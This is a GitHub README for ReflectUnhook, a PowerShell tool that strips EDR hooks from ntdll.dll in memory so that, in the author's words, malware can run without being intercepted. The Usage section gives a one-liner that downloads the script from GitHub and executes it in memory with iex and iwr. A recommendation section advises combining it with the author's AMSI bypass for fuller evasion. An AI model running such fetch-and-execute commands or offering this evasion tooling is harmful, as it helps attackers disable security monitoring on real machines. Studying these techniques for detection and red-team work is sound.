[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/BlackShell256/ReflectUnhook/blob/main/LICENSE)
[![Telegram](https://badgen.net/badge/icon/telegram?icon=telegram&label)](https://t.me/MalwareBit)
[![LinkedIn](https://img.shields.io/static/v1.svg?label=LinkedIn&message=@anibal&logo=linkedin&style=flat&color=blue)](https://www.linkedin.com/in/anibal-5a3870278/)
[![YouTube](https://img.shields.io/badge/YouTube-%23FF0000.svg?logo=YouTube&logoColor=white)](https://www.youtube.com/@MalwarebitTeam)

| English | [Español](README.es.md) |
| --- | --- |

# ReflectUnhook
ReflectUnhook is an advanced tool written in PowerShell that uses Reflection to access the Windows API and low-level functions. This tool focuses on cleaning the hooks present in the ntdll.dll module from memory, restoring its original state by reading ntdll.dll directly from disk.

---

## ¿What are hooks?

Endpoint detection and response (EDR) tools employ a technique called **hooking** to monitor critical system functions in the DLLs of running processes. Hooking involves dynamically modifying system DLLs in memory, which allows EDRs to intercept and analyze the execution flow of a program to assess whether its behavior is legitimate or malicious.

The process works as follows: EDRs alter the initial instructions of certain functions within DLLs. When these functions are called, the program's execution flow is diverted to the EDR's code, which usually resides in a DLL of its own loaded into the process. Once redirected, the EDR examines the parameters of the intercepted functions to determine whether they are being used in a safe or potentially dangerous manner. If the operation is deemed legitimate, the EDR allows the program to resume its normal flow of execution and the function completes without interruption.

To evade detection of an EDR, attackers can resort to a technique known as **unhooking**. This method restores the content of the code section (.text) of the affected DLL to its original state, removing any modifications made by the EDR. This allows the malware to execute its functions without being intercepted or analyzed.
<br><br><ins>Function hooked</ins><br><br>
![image](https://github.com/user-attachments/assets/eed6af23-3e04-430c-962d-5474edc3a739)
<br><br><ins>Clean function after running ReflectUnhook</ins><br><br>
![image](https://github.com/user-attachments/assets/6da4d13f-489f-4736-b9f4-d0ad18e79eb8)

---

## Main features

- **Reflection**: Allows access to low-level Windows API functions without touching the disk using the “Add-Type” (Cmdlet) command.
- **Hooks removal**: Clears hooks in `ntdll.dll` used by AV/EDR solutions.
- **Read from disk**: Retrieves the original state of the module directly from its file on the system.

---

## Usage
To Use ReflectUnhook, run the following commands:

With this command we will execute ReflectUnhook in memory 
```
iex (iwr -UseBasicParsing https://raw.githubusercontent.com/BlackShell256/ReflectUnhook/refs/heads/main/ReflectUnhook.ps1)
```
For execute 
```
Invoke-ReflectUnhook
```
To get verbose and more information about the tool
```
Invoke-ReflectUnhook -v
```

### Usage example
![image](https://github.com/user-attachments/assets/8a69184a-08ab-4115-9ac7-0d19ea4c56d1)

---

## Recommendation
I recommend using ReflectUnhook + AMSI bypass for a more complete evasion, you can use [Null-AMSI](https://github.com/BlackShell256/Null-AMSI) (My custom AMSI Bypass tool) or one of your choice.

---

## Credits

* Much of the code is from PowerSploit's Invoke-ReflectivePEInjection tool. [Github](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)

* Some of the Reflection code I learned from Matt Graeber. [X/Twitter](https://x.com/mattifestation)

